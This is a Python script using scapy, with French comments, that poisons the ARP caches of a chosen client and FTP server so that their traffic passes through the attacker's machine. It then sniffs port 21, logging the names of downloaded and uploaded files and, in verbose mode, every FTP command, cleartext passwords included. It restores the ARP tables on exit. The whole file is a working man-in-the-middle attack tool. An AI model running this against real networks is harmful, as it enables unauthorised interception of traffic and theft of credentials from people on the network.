from scapy.all import ARP, sniff, send
import threading
import time
import argparse

stop_event = threading.Event()
package = {}

def clear_pakage():
    curent_time = time.time()
    for key in list(package):
        if curent_time - package[key] > 0.1:
            del package[key]
    

def arp_spoof(client_ip, client_mac, server_ip, server_mac):
    arp_response = ARP(pdst=client_ip, hwdst=client_mac, psrc=server_ip, op='is-at')  # Replacer l'adresse MAC du serveur par celle de l'attaquant
    arp_response2 = ARP(pdst=server_ip, hwdst=server_mac, psrc=client_ip, op='is-at')  # Replacer l'adresse MAC du client par celle de l'attaquant

    while not stop_event.is_set():
        send(arp_response, verbose=False)
        send(arp_response2, verbose=False)
        time.sleep(1)

def capture_ftp_traffic(pkt, verbose):
    clear_pakage()
    if pkt.haslayer('TCP'):
        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
            if pkt.haslayer('Raw'):
                data = pkt['Raw'].load.decode(errors='ignore')
                if (data in package):
                    return
                if data.startswith('RETR'):
                    print("File download = " + data.split()[1])
                elif data.startswith('STOR'):
                    print("File upload = " + data.split()[1])
                elif verbose:
                    print(data)
                package[data] = time.time()

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("client_ip", help="client IP address")
    parser.add_argument("client_mac", help="client MAC address")
    parser.add_argument("server_ip", help="server IP address")
    parser.add_argument("server_mac", help="server MAC address")
    parser.add_argument("-v", "--verbose", help="view all cmd", action="store_true")
    
    args = parser.parse_args()

    # ARP dans un thread séparé
    arp_thread = threading.Thread(target=arp_spoof, args=(args.client_ip, args.client_mac, args.server_ip, args.server_mac))
    arp_thread.start()

    # Sniffer le trafic FTP
    try:
        sniff(filter="tcp port 21", prn=lambda pkt: capture_ftp_traffic(pkt, args.verbose), stop_filter=lambda x: stop_event.is_set())
    except KeyboardInterrupt:
        stop_event.set()
        print("\nRestauration des adresses MAC...")
        # Restaurer les adresses MAC
        arp_response = ARP(pdst=args.client_ip, hwdst=args.client_mac, psrc=args.server_ip, hwsrc=args.server_mac, op='is-at')
        arp_response2 = ARP(pdst=args.server_ip, hwdst=args.server_mac, psrc=args.client_ip, hwsrc=args.client_mac, op='is-at')
        send(arp_response, verbose=False)
        send(arp_response2, verbose=False)
        arp_thread.join()

if __name__ == "__main__":
    main()
